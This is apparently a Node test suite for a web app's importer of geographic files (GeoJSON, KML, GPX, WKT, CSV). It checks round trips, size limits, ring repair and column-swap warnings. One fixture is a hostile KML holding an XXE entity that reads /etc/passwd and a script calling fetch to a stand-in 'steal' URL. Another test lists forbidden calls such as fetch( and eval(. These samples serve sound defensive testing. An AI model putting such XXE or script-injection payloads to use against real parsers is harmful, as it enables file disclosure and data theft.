// Reading a file a person brings (web/io-formats). The corpus below is small
// and hostile on purpose: the cases that matter are the ones where a file
// tries to make the browser fetch something, where a ring is not closed, and
// where a column is the wrong way round.
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  checkSize,
  inertText,
  MAX_BYTES,
  MAX_VERTICES,
  readDelimited,
  readFile,
  readGeoJson,
  readGpx,
  readKml,
  readWkt,
  repair,
  selfIntersects,
  signedArea,
  sniff,
  splitRow,
  suggestColumns,
} from '../src/lib/import.mjs';
import { exportText, pointsOf } from '../src/lib/export.mjs';
import { nodeHost } from '../../../packages/runtime/src/node.mjs';

const web = new URL('..', import.meta.url).pathname;
const root = join(web, '../..');
const catalog = JSON.parse(readFileSync(join(root, 'dist/catalog/v1.json'), 'utf8'));
const host = nodeHost(join(root, 'dist/wasm'));

test('what this site writes, it can read back', async () => {
  // The round trip the requirement asks for: every geographic export, read.
  const tool = catalog.tools.find((t) => t.id === 'drone.mission.orbit');
  const args = (tool.examples.find((e) => e.id === tool['x-primary-example']) ?? tool.examples[0]).input;
  const result = JSON.parse(await host.invoke(tool.id, JSON.stringify(args)));
  const points = pointsOf(tool, result);
  assert.ok(points.length > 2);
  for (const [format, name] of [['geojson', 'a.geojson'], ['kml', 'a.kml'], ['gpx', 'a.gpx'], ['wkt', 'a.wkt']]) {
    const text = exportText(format, { tool, args, result });
    const back = readFile(name, text);
    assert.ok(back.ok, `${format}: ${back.message}`);
    const read = back.geometries.flatMap((g) => g.coordinates);
    assert.equal(read.length, points.length, format);
    read.forEach(([lon, lat], i) => {
      assert.ok(Math.abs(lat - points[i].lat) < 1e-9, `${format} ${i} latitude`);
      assert.ok(Math.abs(lon - points[i].lon) < 1e-9, `${format} ${i} longitude`);
    });
  }
});

test('a GPX track becomes one line of points', () => {
  // The scenario: a GPX file with one track dropped on a polyline input.
  const gpx = `<?xml version="1.0"?><gpx version="1.1"><trk><name>Ridge</name><trkseg>
    <trkpt lat="40.1" lon="-105.1"><ele>1600</ele></trkpt>
    <trkpt lat="40.2" lon="-105.2"></trkpt>
    <trkpt lat="40.3" lon="-105.3"/>
  </trkseg></trk></gpx>`;
  const out = readGpx(gpx);
  assert.ok(out.ok);
  assert.equal(out.geometries.length, 1);
  assert.equal(out.geometries[0].kind, 'line');
  assert.deepEqual(out.geometries[0].coordinates, [[-105.1, 40.1], [-105.2, 40.2], [-105.3, 40.3]]);
  assert.equal(out.geometries[0].name, 'Ridge');
});

test('an oversized file is refused before it is parsed', () => {
  assert.equal(checkSize(1000), null);
  const message = checkSize(120 * 1e6);
  assert.match(message, /120\.0 MB/);
  assert.match(message, new RegExp(`${MAX_BYTES / 1024 / 1024} MB`));
});

test('too many vertices is refused, with the limit stated', () => {
  const line = { type: 'LineString', coordinates: Array.from({ length: MAX_VERTICES + 1 }, (_, i) => [i % 180, 0]) };
  const out = readGeoJson(JSON.stringify(line));
  assert.equal(out.ok, false);
  assert.match(out.message, /1,000,001 vertices/);
  assert.match(out.message, /1,000,000/);
});

test('a KML that tries to fetch something is read without fetching it', () => {
  // The scenario: a placemark description containing a script tag.
  const kml = `<?xml version="1.0"?><!DOCTYPE kml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <kml><Document>
    <NetworkLink><Link><href>https://example.test/more.kml</href></Link></NetworkLink>
    <Placemark><name>Pad</name>
      <description><![CDATA[<script>fetch('https://example.test/steal')</script>Launch pad]]></description>
      <Point><coordinates>-105.5,40.5,0</coordinates></Point>
    </Placemark>
  </Document></kml>`;
  const out = readKml(kml);
  assert.ok(out.ok);
  assert.deepEqual(out.geometries[0].coordinates, [[-105.5, 40.5]]);
  // The description is the words, not the markup.
  assert.equal(out.geometries[0].description, 'Launch pad');
  assert.ok(!out.geometries[0].description.includes('script'));
  // And what was ignored is named, rather than silently dropped.
  for (const ignored of ['script', 'NetworkLink', 'Link', 'href']) {
    assert.ok(out.ignored.includes(ignored), `${ignored} is not reported`);
  }
  assert.ok(out.ignored.some((i) => i.startsWith('DOCTYPE')), 'the entity declaration is not reported');
  // The entity is never expanded.
  assert.ok(!JSON.stringify(out).includes('/etc/passwd'));
});

test('nothing in the reader fetches anything', () => {
  const source = readFileSync(join(web, 'src/lib/import.mjs'), 'utf8');
  for (const forbidden of ['fetch(', 'XMLHttpRequest', 'importScripts', 'eval(', 'new Function']) {
    assert.ok(!source.includes(forbidden), `the reader uses ${forbidden}`);
  }
});

test('an unclosed ring is closed, and the repair is reported', () => {
  // The scenario: an imported WKT polygon whose ring is not closed.
  const out = readWkt('POLYGON ((0 0, 1 0, 1 1, 0 1))');
  assert.ok(out.ok);
  const ring = out.geometries[0].coordinates;
  assert.deepEqual(ring[0], ring.at(-1));
  assert.ok(out.repairs.some((r) => r.includes('ring closed')), out.repairs.join('; '));
});

test('a repeated vertex goes, and a clockwise ring is turned round', () => {
  const { geometry, repairs } = repair({ kind: 'polygon', coordinates: [[0, 0], [0, 0], [0, 1], [1, 1], [1, 0], [0, 0]], name: 'p' });
  assert.ok(repairs.some((r) => r.includes('repeated')), repairs.join('; '));
  assert.ok(repairs.some((r) => r.includes('counter-clockwise')), repairs.join('; '));
  assert.ok(signedArea(geometry.coordinates.slice(0, -1)) > 0);
});

test('a ring that crosses itself is reported, not quietly fixed', () => {
  const bowtie = [[0, 0], [2, 2], [2, 0], [0, 2], [0, 0]];
  assert.ok(selfIntersects(bowtie));
  const { repairs, valid } = repair({ kind: 'polygon', coordinates: bowtie, name: 'bowtie' });
  assert.ok(repairs.some((r) => r.includes('crosses itself')));
  assert.equal(valid, false);
  // A plain square does not.
  assert.equal(selfIntersects([[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]), false);
});

test('a CSV with the columns the wrong way round says so', () => {
  // The scenario: a latitude column holding values outside 90 degrees.
  const csv = 'name,latitude,longitude\nA,-105.1,40.1\nB,-105.2,40.2\n';
  const out = readDelimited(csv);
  assert.deepEqual(out.headers, ['name', 'latitude', 'longitude']);
  assert.equal(out.rows.length, 2);
  assert.deepEqual(out.columns, { lat: 1, lon: 2 });
  assert.equal(out.swapped, true);
  assert.match(out.warnings[0], /beyond/);
  assert.deepEqual(out.repairs, [], 'a column warning is not a repair');
});

test('a CSV cell holding a comma or a quote survives the trip', () => {
  assert.deepEqual(splitRow('a,"b,c","say ""hi"""', ','), ['a', 'b,c', 'say "hi"']);
  assert.deepEqual(splitRow('a\tb', '\t'), ['a', 'b']);
  assert.deepEqual(suggestColumns(['Name', 'Lat', 'Long']), { lat: 1, lon: 2 });
  assert.deepEqual(suggestColumns(['a', 'b']), { lat: -1, lon: -1 });
});

test('a file is recognised by its name, or by what it starts with', () => {
  assert.equal(sniff('a.geojson', ''), 'geojson');
  assert.equal(sniff('a.KML', ''), 'kml');
  assert.equal(sniff('', '<?xml version="1.0"?><gpx version="1.1">'), 'gpx');
  assert.equal(sniff('', '{"type":"Point"}'), 'geojson');
  assert.equal(sniff('', 'POINT (1 2)'), 'wkt');
  assert.equal(sniff('', 'a,b\n1,2'), 'csv');
  assert.equal(sniff('a.txt', 'nothing in particular'), null);
});

test('a projected GeoJSON is refused rather than read as degrees', () => {
  const out = readGeoJson(JSON.stringify({ type: 'Point', coordinates: [500000, 4500000], crs: { properties: { name: 'EPSG:26913' } } }));
  assert.equal(out.ok, false);
  assert.match(out.message, /EPSG:26913/);
});

test('markup in a description is shown as the words it holds', () => {
  assert.equal(inertText('<b>Bold</b> &amp; plain'), 'Bold & plain');
  assert.equal(inertText('<script>alert(1)</script>after'), 'after');
  assert.equal(inertText('<![CDATA[inside]]>'), 'inside');
});

test('a format the reader does not know says so plainly', () => {
  const out = readFile('a.kmz', 'PK');
  assert.equal(out.ok, false);
  assert.match(out.message, /zipped KML/);
  assert.equal(readFile('a.xyz', 'nothing').ok, false);
});
